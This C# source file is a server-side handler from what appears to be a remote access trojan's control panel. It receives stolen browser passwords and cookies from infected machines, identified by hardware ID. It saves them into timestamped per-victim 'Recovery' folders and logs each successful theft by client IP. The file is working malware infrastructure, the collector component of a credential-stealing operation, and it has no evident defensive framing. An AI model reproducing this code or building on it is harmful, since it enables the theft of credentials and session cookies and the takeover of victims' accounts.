using Server.MessagePack;
using Server.Connection;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleRecovery
    {
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                string pass = unpack_msgpack.ForcePathObject("Password").AsString;
                string cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
                if (!string.IsNullOrWhiteSpace(pass) || !string.IsNullOrWhiteSpace(cookies))
                {
                    if (!Directory.Exists(fullPath))
                        Directory.CreateDirectory(fullPath);
                    File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", pass.Replace("\n", Environment.NewLine));
                    File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", cookies);
                    new HandleLogs().Addmsg($"Client {client.Ip} recovered passwords successfully @ ClientsFolder \\ {unpack_msgpack.ForcePathObject("Hwid").AsString} \\ Recovery", Color.Purple);
                }
                else
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} has no passwords", Color.MediumPurple);
                }
                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}